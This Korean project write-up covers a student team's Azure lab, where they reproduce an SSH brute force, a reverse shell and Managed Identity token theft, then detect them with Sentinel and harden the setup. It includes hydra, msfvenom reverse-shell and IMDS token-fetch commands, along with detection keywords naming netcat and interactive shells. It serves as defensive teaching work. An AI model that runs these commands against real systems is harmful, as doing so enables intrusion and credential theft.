---
layout: post
title: "Azure 클라우드 행위기반 보안탐지 및 대응"
date: 2026-08-04 00:00:00 +0900
category: project
permalink: /project/azure-behavior-detection-response/
---

## 프로젝트 요약

| 항목 | 내용 |
|---|---|
| 수행 기간 | 2026.06.09 ~ 2026.07.01 |
| 팀 구성 | 5명 |
| 나의 역할 | Hydra SSH Brute Force·msfvenom Reverse Shell 공격 실습, Kali 공격 환경, 결과 보고서 |
| 팀 프로젝트 범위 | SSH·프로세스 실행 로그 수집, Sentinel 탐지, 호스트·네트워크 방어, Key Vault 접근 검증 |
| 핵심 결과 | 공격 재현 후 SSH 강화·4444 포트 차단 재검증, 팀의 로그·인시던트 및 Key Vault 403 결과 정리 |


### 내가 담당한 작업

- Kali 공격 환경을 구성하고 Hydra SSH Brute Force를 재현했다.
- msfvenom Reverse Shell 페이로드를 준비해 실습 대상 호스트에서 연결 결과를 확인했다.
- 공격·탐지·방어 과정과 결과를 보고서로 정리했다.

**팀 협업 범위:** Terraform·네트워크, Key Vault·Managed Identity 시나리오, Sentinel·Log Analytics 및 개인 계정 MDE/JIT 확장 검증은 역할을 나누어 진행했다. 해당 결과는 팀 전체 검증으로 구분한다.

**실험 조건:** Reverse Shell은 실습 대상 호스트에 접속해 페이로드를 실행한 뒤 연결·탐지·차단을 확인한 실험이다. 외부에서 최초 침투까지 자동으로 수행한 실험은 아니다.

---

Azure 클라우드 실습 환경에서 Bastion 호스트를 대상으로 SSH Brute Force·Reverse Shell·Key Vault Managed Identity 토큰 탈취 3개 시나리오를 공격 → 탐지 → 방어 순서로 검증한 과정을 정리하였다.

---

### 1. 개요

이번 프로젝트는 호스트·아이덴티티 관점의 "행위"에 초점을 맞췄다. Bastion 호스트에서 발생하는 로그인 시도·프로세스 실행 같은 행위 자체를 Syslog·auditd로 수집해서 Microsoft Sentinel이 탐지·대응하는 과정을 검증하는 게 핵심이다.

<br>

**3개 공격 시나리오**

| 시나리오 | 공격 내용 | 주요 탐지 |
|---|---|---|
| 시나리오 1 | SSH Brute Force (Hydra → Bastion) | ssh-bruteforce (Sentinel) |
| 시나리오 2 | Reverse Shell (msfvenom → Bastion) | reverse-shell-exec (Sentinel) |
| 시나리오 3 | Key Vault 비정상 접근 (IMDS Managed Identity 토큰 탈취) | Key Vault auditEvent (KQL) |

<br>

---

### 2. 공격 시나리오 정의

공격자는 외부에 노출된 Bastion 공인 IP로 접근하는 외부 위협 행위자로 가정했다. 별도 서브넷(snet-kali, 10.0.10.0/24)에 Kali Linux VM을 공격자 환경으로 배치해서, hydra·msfvenom으로 공격 흐름을 재현했다. 시나리오 순서는 SSH 크리덴셜을 무차별 대입으로 획득 → Bastion 내부에서 Reverse Shell로 원격 제어 확보 → Web VM까지 침투해 Azure IMDS로 Managed Identity 토큰을 탈취하고 Key Vault로 공격을 확장하는 흐름이다.

- **Bastion VM** : Rocky Linux 9 · SSH 점프 호스트 · 취약한 테스트 계정이 구성된 관리자 접근 진입점
- **Web VM** : Azure Managed Identity가 부여돼 있어, IMDS로 토큰을 탈취당하면 Key Vault 등 연계 리소스로 공격이 확장될 수 있음
- **Key Vault** : DB 비밀번호 등 민감 시크릿을 저장하는, 토큰 탈취 시나리오의 최종 목표 자산

<br>

---

### 3. 전체 인프라 구성

관리 영역인 snet-bastion(10.0.0.0/24)과 위협·공격자 영역인 snet-kali(10.0.10.0/24)를 중심으로 구성했다.

![전체 인프라 아키텍처 구성도](/assets/images/azure-behavior-detection-response/01-infra-architecture-overview.png)

<br>

| 서브넷 | CIDR | 역할 | 공인 IP |
|---|---|---|---|
| snet-bastion | 10.0.0.0/24 | 관리 (Bastion VM, SSH 점프호스트) | O |
| snet-kali | 10.0.10.0/24 | 위협/공격자 (Kali) | O |

<br>

hardening_enabled(기본값 false)는 Bastion NSG의 규칙명·우선순위만 바꿀 뿐 서브넷 자체를 막지는 않는다. 코드 주석에도 명시했듯, SSH 브루트포스 방어는 NSG 레벨이 아니라 Bastion VM 내부의 fail2ban 강화와 PasswordAuthentication 비활성화가 담당하도록 설계했다 — NSG는 두 모드 모두 my_ip_cidr(기본값 0.0.0.0/0)만 보기 때문에, Hydra 트래픽 자체는 강화 모드에서도 NSG를 그대로 통과한다.

<br>

**주요 서버**

| VM | OS / 역할 | 설치 소프트웨어 · 내부 설정 |
|---|---|---|
| Bastion | Rocky Linux 9 / 관리 | EPEL · rsyslog · fail2ban + fail2ban-firewalld · auditd · 취약 계정 |
| 공격자 | Kali / 위협 | nmap · hydra · msfvenom · netcat |

<br>

---

### 4. 관제 및 로그 파이프라인

Bastion의 SSH 인증 로그(Syslog)와 auditd 실행 로그는 AMA(Azure Monitor Agent)+DCR을 통해 Log Analytics로 수집된다. DCR의 facility에는 auth·authpriv(SSH)와 local2(auditd)가 등록돼 있다. Key Vault의 접근 감사 로그(auditEvent)는 진단 설정으로 별도 수집한다. 공격자 VM(Kali)은 모니터링 대상에서 제외해 AMA를 설치하지 않는다.

| 로그 소스 | 수집 방법 | 분석 규칙 |
|---|---|---|
| Bastion SSH | AMA+DCR (Syslog, auth/authpriv) | ssh-bruteforce |
| Bastion auditd | auditd → rsyslog(local2) → AMA/DCR | reverse-shell-exec |
| Key Vault 접근 | 진단 설정 (AzureDiagnostics/auditEvent) | KQL 직접 조회 |

- **ssh-bruteforce** : Syslog에서 Facility가 auth/authpriv이고 'Failed password' 메시지가 5분 내 5회 이상이면 인시던트 생성
- **reverse-shell-exec** : Facility=local2이고 메시지에 'exec_log'와 `/bin/sh`·`/bin/bash`·`/bin/dash`·`nc`·`ncat`·`bash -i`·`sh -i` 중 하나 이상 포함되면 인시던트 생성
- **Key Vault 비정상 접근** : 별도 예약 규칙 대신, OperationName이 SecretGet/SecretList이고 httpStatusCode_d(403 등)를 KQL로 직접 조회해서 식별

이 프로젝트의 코드는 두 계정에 걸쳐 있다. 실습 계정은 시나리오 1·2(SSH Brute Force, Reverse Shell)의 핵심 인프라와 hardening_enabled 토글을 담당하고, 개인 계정은 그 인프라를 이어받아 시나리오 3(Key Vault)과 개인 계정 확장 기능(Defender for Cloud, MDE, Sentinel Playbook, Azure Policy, Network Watcher)을 담당한다.

<br>

---

### 5. 공격 시나리오별 감지 및 테스트

**시나리오 1 — SSH Brute Force (Hydra → Bastion)**

기본 모드는 PasswordAuthentication yes + my_ip_cidr 기본값 0.0.0.0/0 + fail2ban maxretry=1000으로 구성돼 있어 무차별 대입이 거의 차단되지 않는다.

① 공격 — Kali에서 Bastion 공인 IP를 대상으로 Hydra 브루트포스를 실행했다.

```
hydra -l <bastion_test_user> -P <wordlist> ssh://<bastion_public_ip>
```

![Kali에서 Hydra로 Bastion SSH 브루트포스 실행](/assets/images/azure-behavior-detection-response/02-scenario1-hydra-attack.png)

② 탐지 — Syslog에서 Facility가 auth/authpriv이고 'Failed password'가 5분 내 5회 이상 발생하면 Sentinel 인시던트가 생성되도록 구성했고, 실제로 Log Analytics KQL 조회와 Sentinel Incidents 탭에서 인시던트 발생을 확인했다.

![Microsoft Sentinel — SSH Brute Force 인시던트 발생 확인](/assets/images/azure-behavior-detection-response/03-scenario1-sentinel-incident.png)

③ 방어 — 강화 모드에서는 PasswordAuthentication이 no로 전환되고 계정이 잠금(nologin) 처리되며, fail2ban의 maxretry가 1000→3, bantime이 1초→3600초로 강화된다. 적용 후 동일한 Hydra 공격을 재실행한 결과 차단됨을 확인했다.

![강화 모드 적용 후 Hydra 재실행 — 차단 확인](/assets/images/azure-behavior-detection-response/04-scenario1-hardened-block.png)

<br>

**시나리오 2 — Reverse Shell (msfvenom → Bastion)**

① 공격 — Kali에서 msfvenom으로 리버스 쉘 페이로드(ELF)를 생성한 뒤, 임시 웹서버로 공개해서 Bastion에서 다운로드받아 실행하게 했다.

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f elf -o shell.elf
```

Bastion에서 페이로드를 내려받아 실행하자 공격자 쪽 리스너에 리버스 쉘 연결이 성공했다(강화 전).

![Bastion에서 페이로드 실행 직후 리스너에 리버스 쉘 연결 성공](/assets/images/azure-behavior-detection-response/05-scenario2-reverse-shell-success.png)

② 탐지 — Bastion에 설치된 auditd 규칙(`-a always,exit -F arch=b64 -S execve -k exec_log`)이 프로세스 실행을 감사하고, rsyslog imfile을 통해 local2로 전달돼 Log Analytics의 Syslog 테이블에 쌓인다. Log Analytics에서 실행 로그를 확인했고, Microsoft Defender 인시던트 목록에서도 'Possible reverse shell', 'Suspicious process launched from a world-writable directory' 등 다수의 실제 인시던트가 발생함을 확인했다.

![Microsoft Defender 인시던트 — Possible reverse shell 등 확인](/assets/images/azure-behavior-detection-response/06-scenario2-defender-incident.png)

③ 방어 — Bastion NSG의 아웃바운드 규칙을 80/443/22/3306만 허용하고 나머지는 전부 Deny(Deny-All-Outbound)하도록 구성했다. 포트 4444로 리버스 쉘 연결을 재시도한 결과 `Connection timed out`으로 실제 차단됨을 확인했다.

![강화된 NSG 적용 후 재시도 — Connection timed out](/assets/images/azure-behavior-detection-response/07-scenario2-nsg-block.png)

다만 공격자가 80/443 포트로 리스너를 열면 HTTPS 트래픽처럼 보여 NSG만으로는 차단할 수 없다는 한계도 확인했다. 그래서 실제 방어는 계층별로 나눠 구성했다.

| 계층 | 방어 수단 | 막을 수 있는 것 |
|---|---|---|
| 네트워크 | NSG Deny All (80·443·22·3306 외 차단) | 비표준 포트(4444 등) 리버스 쉘 |
| 프로세스 | Defender for Endpoint | /tmp 실행 자체 차단 |
| 탐지 | Sentinel + auditd | 실행 후 즉시 알림 (표준 포트 우회해도 탐지) |
| 격리 | Playbook 자동 대응 | 인시던트 발생 시 VM 자동 격리 |

<br>

**시나리오 3 — Key Vault 비정상 접근 (Managed Identity 토큰 탈취)**

외부에서 인증 없이 직접 접근을 시도하는 시나리오 A와, Bastion을 거쳐 Web VM에 침투한 뒤 IMDS로 토큰을 탈취하는 시나리오 B로 나눠 진행했다.

시나리오 A — 공격자 VM에서 토큰 없이, 그리고 위조된 가짜 토큰으로 Key Vault REST API에 직접 접근을 시도했으나 각각 "토큰 없음" 오류와 "Unauthorized" 오류로 즉시 거부됐다. db-password 등 시크릿 이름을 추측해 접근을 시도했으나 모두 거부됐다.

시나리오 B — Bastion을 경유해 Web VM에 접속한 뒤, Azure IMDS를 호출해 Web VM에 할당된 Managed Identity의 실제 액세스 토큰을 탈취하는 데 성공했다.

```
curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
  -H "Metadata:true"
```

![Web VM에서 IMDS를 통해 Managed Identity 토큰 탈취 성공](/assets/images/azure-behavior-detection-response/08-scenario3-imds-token-theft.png)

탈취한 토큰으로 Key Vault 시크릿 목록·조회를 시도한 결과, 토큰 자체는 유효했지만 Web VM의 Managed Identity에 Key Vault 권한('Key Vault Secrets User' 역할)이 부여돼 있지 않아 Forbidden으로 거부됐다.

② 탐지 — Key Vault 진단 로그(AzureDiagnostics, auditEvent)를 Log Analytics로 확인한 결과, Bastion IP의 Authentication 이벤트와 Web VM 아웃바운드 IP의 SecretGet/SecretList 이벤트가 각각 ResultType=Success로 기록됐다. 다만 httpStatusCode_d는 403이었는데, 이는 Azure가 인증(토큰 유효성)과 인가(권한 여부)를 구분해서 로그를 남기기 때문이다 — 토큰은 유효했지만(Success) 실제 접근 권한은 거부(403 Forbidden)된 것이다.

![Log Analytics — httpStatusCode_d=403(Forbidden)과 Managed Identity 확인](/assets/images/azure-behavior-detection-response/09-scenario3-forbidden-log.png)

③ 방어 — Web VM의 Managed Identity에는 Key Vault에 대한 어떠한 역할도 부여돼 있지 않아서, 토큰 탈취에 성공하고도 시크릿에는 접근하지 못했다(403 Forbidden). 만약 Web VM에 'Key Vault Secrets User' 이상의 과도한 권한이 부여돼 있었다면 토큰 탈취 즉시 시크릿 값이 그대로 노출됐을 것이다. 최소 권한 원칙을 지킨 구성이 IMDS 토큰 탈취라는 실제 위협에 대해 그 자체로 방어가 됐고, 권한이 없어도 탈취 시도 자체는 감사 로그에 전부 기록돼 탐지가 가능하다는 것도 확인했다.

<br>

---

### 6. 계정 권한 제약과 개인 계정 확장 검증

실습 계정에는 구독 소유자·테넌트 보안 관리자 권한이 없어서 Microsoft Defender for Endpoint(MDE), Just-In-Time(JIT) VM 접근 제어 같은 호스트·엔드포인트 중심의 고급 기능을 켤 수 없었다. 팀의 담당자가 별도 개인 계정에서 아래 항목을 확장 검증했다. 이 절은 팀 산출물이며 나의 단독 구축 결과로 제시하지 않는다.

- **Microsoft Defender for Endpoint** : Bastion을 디바이스 인벤토리에 등록하고, SSH Brute Force·Reverse Shell 행위가 엔드포인트 관점에서도 인시던트·MITRE ATT&CK 매핑으로 식별되는지, Advanced Hunting·사용자 지정 탐지 규칙·Playbook 자동화·이메일 알림까지 이어지는지 확인
- **Just-In-Time(JIT) VM 접근** : Bastion SSH 포트를 상시 개방하지 않고 승인된 시간·IP에만 임시로 열어주는 접근 제어 검증

![MITRE ATT&CK 매핑 — 탐지된 행위의 공격 기법 분류](/assets/images/azure-behavior-detection-response/10-mde-mitre-attack-mapping.png)

Sentinel Playbook 연계는 인시던트 발생 시 공격 IP 차단을 자동화하는 SOAR 대응이라, 수동 강화(hardening_enabled)를 자동화로 잇는 연장선이다. JIT는 SSH 포트 상시 노출 자체를 줄이는 예방적 접근 제어로, hardening_enabled 토글(호스트 내부 강화)과 상호 보완적이다.

<br>

---

### 7. 성과, 한계, 다음 단계

**이번 프로젝트로 배운 것**

- 행위 기반 탐지 원리 : 단순 로그 수집이 아니라 반복 인증 실패·프로세스 실행·비정상 토큰 사용 같은 '행위 패턴'으로 위협을 식별하는 방식을 실제 공격 재현으로 확인
- NSG(네트워크 레벨)와 호스트 내부 설정(fail2ban, PasswordAuthentication)의 방어 책임 분리, 그리고 NSG만으로 막을 수 없는 표준 포트 우회를 auditd·Sentinel 탐지로 보완하는 다층 방어 구조
- 인증과 인가의 구분 : 토큰 탈취에 성공해도(인증 성공) 권한이 없으면(인가 실패, 403) 실제 피해로 이어지지 않는다는 것을 Key Vault 시나리오로 확인 — 최소 권한 원칙의 실효성
- 엔드포인트 탐지(MDE)와 예방적 접근 제어(JIT)를 결합한 다층 방어 개념

이번 실습에서는 공격 재현 결과를 로그·인시던트·접근 거부 결과와 연결해 정리했다. 운영 환경에 적용하려면 정상 트래픽 기준, 탐지 오탐, 차단 영향과 격리 승인 절차를 추가 검증해야 한다. 공격 실습과 보고서를 담당하면서 네트워크 연결 여부만으로 공격 실행이나 차단을 판단하지 않고, 호스트 로그와 실제 결과를 함께 확인하는 습관을 배웠다.

<br>

**향후 과제**

| 항목 | 내용 |
|---|---|
| Playbook 자동 대응 확장 | Sentinel Playbook 연계를 확대하고 IP 차단·VM 격리의 실제 실행 결과와 정상 사용자 영향을 검증 |
| 과도한 권한 부여 시 영향 검증 | Key Vault 시나리오에서 Web VM Managed Identity에 의도적으로 과도한 권한을 부여했을 때의 실제 노출 영향을 통제된 환경에서 추가 검증 |
